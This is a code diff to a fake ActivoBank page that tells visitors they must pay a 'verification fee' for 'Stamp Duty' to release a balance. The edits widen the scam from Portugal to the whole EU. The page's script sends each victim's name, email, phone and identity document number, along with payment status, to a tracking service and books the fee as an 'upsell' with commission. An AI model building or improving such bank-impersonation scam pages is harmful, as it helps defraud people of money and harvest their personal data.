@@ -190,7 +190,7 @@ window.apiUrl = window.apiUrl || function (p) {
 
   <!-- Description -->
   <div style="margin:10px 16px 0;background:#e5e7eb;border-radius:16px;padding:18px;">
-    <p style="font-size:13px;color:#374151;line-height:1.65;">To receive the available balance, payment of the user verification fee is required. This fee covers the cost of the <strong style="color:#0a0a0a;">Stamp Duty</strong> applicable in Portugal, ensuring the process complies with Tax Authority regulations and helps prevent any type of fraud.</p>
+    <p style="font-size:13px;color:#374151;line-height:1.65;">To receive the available balance, payment of the user verification fee is required. This fee covers the cost of the <strong style="color:#0a0a0a;">Stamp Duty</strong> applicable under EU tax regulations, ensuring the process complies with tax authority requirements and helps prevent any type of fraud.</p>
   </div>
 
   <!-- Footer text -->
@@ -214,7 +214,7 @@ window.apiUrl = window.apiUrl || function (p) {
     <div class="logo-wrap">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="ActivoBank"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">ActivoBank</text></svg>
     </div>
-    ActivoBank<br/>Branch in Portugal – Lisbon – 1050-001
+    ActivoBank<br/>Operating across the European Union
   </div>
 
 </div>
@@ -283,7 +283,7 @@ async function sendUtmify(status,orderId,createdAt,approvedDate){
   try{
     await fetch(apiUrl(UTMIFY_API),{method:'POST',headers:{'Content-Type':'application/json',},
       body:JSON.stringify({orderId,platform:'ActivoBankCredit',paymentMethod:'pix',status,createdAt,approvedDate:approvedDate||null,refundedAt:null,
-        customer:{name:nome,email,phone:phone||null,document:doc,country:'PT'},
+        customer:{name:nome,email,phone:phone||null,document:doc,country:(localStorage.getItem('phoneCountryIso')||'PT')},
         products:[{id:'imposto-selo',name:'Stamp Duty — ActivoBank Credit',planId:null,planName:'upsell 3',quantity:1,priceInCents:cents}],
         trackingParameters:getUtmParams(),
         commission:{totalPriceInCents:cents,gatewayFeeInCents:0,userCommissionInCents:cents,currency:'EUR'},isTest:false})});
